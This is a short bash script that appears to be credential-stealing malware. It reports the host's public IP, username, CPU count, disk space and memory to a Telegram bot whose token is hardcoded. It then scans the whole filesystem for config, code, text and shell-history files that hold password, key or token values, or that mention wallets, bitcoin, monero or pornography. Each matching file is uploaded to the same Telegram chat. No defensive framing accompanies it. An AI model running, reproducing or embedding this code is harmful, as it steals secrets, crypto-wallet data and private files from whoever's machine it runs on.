#!/bin/bash
CORES="$(nproc --all)"
HOMESPACE=$(df -h /home | awk 'NR==2 {print $4}')
ROOTSPACE=$(df -h / | awk 'NR==2 {print $4}')
FREEMEMORY=$(free -h | awk '/Mem:/ {print $7}')
echo "start"
curl -s -o /dev/null -X POST -H "Content-Type: application/json" -d "{\"chat_id\": \"-4170749466\", \"text\": \"start pannElid $(curl -s http://ifconfig.me) $(whoami)\nCORES: $CORES\nHOMESPACE: $HOMESPACE\nROOTSPACE: $ROOTSPACE\nFREEMEMORY: $FREEMEMORY\", \"disable_notification\": false}" https://api.telegram.org/bot6694357231:AAECeQxIO2Nkd2b8w7v9ELtG0CaW_hG5usE/sendMessage

find / \( -path '*/VisualStudio*' -o -path '*/Program Files*' -o -path '*/node_modules/*' -o -path '*/vendor/*' -o -path '*/bitnami/*' -o -path '*/usr/*' -o -path '*/python*/*' \) -prune -o -type f \( -iname '*.js' -o -iname '*.php' -o -iname '*.ini' -o -iname '*.conf' -o -iname '*.cnf' -o -iname '*.py' -o -iname '*.txt' -o -iname '*.json' -o -iname '*.bash_history' \) -size -100k -exec grep -rHnPi "((password|pass|passwd|mypw|key|pw|token)(\s*[:=]\s*['\"][^'\"\n]+['\"]))|(porn|sex[^a-z]|wallet|usdt|btc|monero)" {} \; 2>/dev/null | awk 'length($0) < 70' | cut -d':' -f1 | sort -u | while read file; do sleep 2; curl -s -X POST -F "document=@$file" https://api.telegram.org/bot6694357231:AAECeQxIO2Nkd2b8w7v9ELtG0CaW_hG5usE/sendDocument?chat_id=-4170749466; done

curl -s -o /dev/null -X POST -H "Content-Type: application/json" -d "{\"chat_id\": \"-4170749466\", \"text\": \"end pannElid $(curl -s http://ifconfig.me)\", \"disable_notification\": false}" https://api.telegram.org/bot6694357231:AAECeQxIO2Nkd2b8w7v9ELtG0CaW_hG5usE/sendMessage

echo "eval"

echo "add"

echo "rem"
